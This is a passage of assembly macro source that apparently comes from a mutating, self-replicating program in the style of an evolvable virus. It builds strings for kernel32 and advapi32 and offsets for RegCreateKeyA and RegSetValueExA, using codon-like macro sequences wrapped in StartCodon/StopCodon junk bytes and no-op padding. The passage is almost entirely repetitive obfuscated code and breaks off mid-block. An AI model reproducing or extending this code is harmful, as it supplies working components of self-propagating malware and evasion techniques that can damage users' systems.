        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 217
db 43
db 163
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x01D1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mSetErrorMode-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 109
db 66
db 207
db 221
db 120
db 36
db 97
db 29
db 177
db 91
db 50
db 115
db 193
db 46
db 225
db 154
db 161
db 235
db 0
db 89
db 99
db 106
db 131
db 225
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 20
db 171
db 32
db 184
db 199
db 249
db 85
db 24
db 19
db 180
db 139
db 234
db 127
db 176
db 147
db 38
db 117
db 0
db 95
db 52
db 138
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0CBB
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 67
db 131
db 182
db 235
db 235
db 157
db 120
db 61
db 101
db 197
db 251
db 112
db 230
db 154
db 5
db 1
db 45
db 214
db 53
db 205
db 133
db 9
db 88
db 138
db 5
db 216
db 142
db 120
db 253
db 211
db 35
db 198
db 154
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 64
db 11
db 187
db 90
db 187
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 196
db 163
db 85
db 233
db 180
db 252
db 98
db 106
db 107
db 53
db 159
db 243
db 79
db 17
db 87
db 213
db 141
db 173
db 4
db 56
db 151
db 132
db 91
db 217
db 145
db 232
db 96
db 203
db 10
db 237
db 206
db 197
db 59
db 233
db 147
db 0
db 125
db 65
db 222
db 236
db 173
db 50
db 167
db 89
db 219
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mRegCreateKeyA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 209
db 157
db 17
db 83
db 166
db 92
db 132
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0EDC
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mRegSetValueExA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 134
db 112
db 176
db 36
db 198
db 78
db 21
db 106
db 4
db 24
db 38
db 22
db 241
db 149
db 39
db 220
db 167
db 81
db 211
db 236
db 153
db 101
db 70
db 195
db 187
db 225
db 156
db 117
db 18
db 221
db 89
db 118
db 23
db 23
db 217
db 61
db 221
db 218
db 132
db 205
db 195
db 95
db 127
db 64
db StartCodon
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0845
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 24
db 212
db 149
db 216
db 80
db 85
db 217
db 84
db 251
db 188
db 5
db 203
db 251
db 248
db 58
db 147
db 2
db 139
db 185
db 25
db 170
db 167
db 107
db 253
db 239
db 146
db 249
db 18
db 76
db 146
db 181
db 128
db 231
db 203
db 68
db 254
db 203
db 169
db 180
db 137
db 68
db 30
db 55
db 43
db 12
db 115
db 176
db 67
db 85
db 106
db 159
db 61
db 85
db 57
db 57
db 8
db 0
db 141
db 139
db 96
db 117
db 196
db 202
db 82
db 108
db 153
db 234
db 199
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 197
db 108
db 81
db 49
db 163
db 227
db 187
db 68
db 77
db 254
db 179
db 181
db 177
db 144
db 62
db 20
db 131
db 241
db 63
db 235
db 159
db 149
db 241
db 44
db 237
db 122
db 250
db 21
db 103
db 245
db 25
db 120
db 118
db 9
db 134
db 185
db 227
db 133
db 129
db 116
db 94
db 226
db 177
db 79
db 16
db 136
db 248
db 115
db 69
db 195
db 204
db 87
db 77
db 181
db 154
db 59
db 63
db 6
db 196
db 21
db 2
db 161
db 19
db 107
db 2
db 91
db 196
db 240
db 29
db 211
db 251
db 95
db 6
db 204
db 90
db 101
db 173
db 35
db 44
db 16
db 153
db 72
db 46
db 134
db 57
db 10
db 253
db 21
db 70
db 61
db 10
db StartCodon


    _getDO
    BigNum=stDLLkernel32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff                      ; to the data-section. This will be used
       _nopdA                           ; by LoadLibraryA as argument later
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='kern'
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 52
db 243
db 89
db 104
db 194
db 105
db 4
db 2
db 168
db 236
db 170
db 65
db 164
db 10
db 67
db 121
db 150
db 195
db 182
db 233
db 194
db 145
db 35
db 254
db 84
db 106
db 237
db 154
db 23
db 53
db 86
db 255
db 99
db 194
db 144
db 37
db 99
db 189
db 61
db 144
db 57
db 107
db 135
db 55
db 243
db 95
db 163
db 163
db 41
db 85
db 15
db 42
db 86
db 15
db 127
db 162
db 106
db 140
db 120
db 78
db 60
db 177
db 74
db 116
db 111
db 28
db 235
db 67
db 118
db 131
db 68
db 248
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 149
db 67
db 35
db 15
db 131
db 235
db 21
db 137
db 171
db 129
db 233
db 37
db 66
db 87
db 81
db 139
db 164
db 216
db 41
db 79
db 191
db 223
db 233
db 127
db 26
db 105
db 246
db 254
db 182
db 247
db 231
db 126
db 75
db 253
db 33
db 27
db 178
db 208
db 63
db 198
db StartCodon

       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='el32'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 40
db 170
db 24
db 56
db 200
db 165
db 43
db 234
db 188
db 40
db 134
db 135
db 160
db 114
db 135
db 248
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 187
db 209
db 143
db 125
db 37
db 215
db 71
db 123
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 216
db 56
db 128
db 122
db 14
db 144
db 150
db 187
db 21
db 59
db 53
db 243
db 66
db 217
db 223
db 183
db 117
db 17
db 206
db 161
db 17
db 22
db 204
db 48
db 79
db 89
db 24
db 253
db 120
db 71
db 138
db 99
db 101
db 94
db 199
db 110
db 42
db 89
db 238
db 132
db 100
db 221
db 4
db 5
db 137
db 11
db 209
db 165
db 144
db 64
db StartCodon

       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 86
db 97
db 56
db 54
db 93
db 169
db 188
db 52
db 224
db 20
db 37
db 167
db 24
db 67
db 111
db 246
db 14
db 96
db 154
db 96
db 129
db 238
db 105
db 237
db 29
db 217
db 243
db 235
db 207
db 170
db 167
db 101
db 249
db 137
db 101
db 133
db 12
db 26
db 117
db 174
db 42
db 247
db 98
db 244
db 107
db 87
db 129
db 127
db 184
db 232
db 19
db 23
db 21
db 188
db 188
db 169
db 5
db 123
db 234
db 132
db 5
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 216
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='.dll'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 246
db 110
db 211
db 122
db 65
db 82
db 77
db 38
db 113
db 205
db 158
db 153
db 6
db 134
db 53
db 27
db 186
db 149
db 231
db 75
db 248
db 184
db 44
db 37
db 92
db 92
db 104
db 102
db 40
db 245
db 221
db 41
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
    _getDO
    BigNum=stDLLadvapi32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 212
db 135
db 59
db 199
db 57
db 123
db 171
db 100
db 73
db 193
db 15
db 59
db 204
db 41
db 193
db 242
db 195
db 61
db 131
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 111
db 230
db 54
db 195
db 155
db 243
db 77
db 44
db 177
db 145
db 35
db 241
db 235
db 169
db 46
db 228
db 29
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='adva'
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 244
db 82
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 50
db 183
db 66
db 187
db 60
db 106
db 196
db 23
db 158
db 105
db 9
db 53
db 172
db 248
db 251
db 227
db 223
db 22
db 58
db 227
db 8
db 88
db 18
db 82
db 15
db 234
db 182
db 2
db 26
db 151
db 250
db 7
db 113
db 140
db 31
db 117
db 183
db 62
db 84
db 95
db 63
db 132
db 123
db 65
db 87
db 117
db 186
db 240
db 120
db 132
db 22
db 232
db 194
db 145
db 112
db 170
db 101
db 161
db 142
db 51
db 45
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 80
db 206
db 166
db 162
db 101
db 151
db 18
db 11
db 241
db 194
db 153
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 128
db 205
db 151
db 142
db 26
db 238
db 163
db 194
db 249
db 216
db 177
db 233
db 63
db 254
db 224
db 30
db 147
db 86
db 220
db 151
db 191
db 80
db 249
db 66
db 214
db 155
db 83
db 125
db StartCodon
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 93
db 240
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
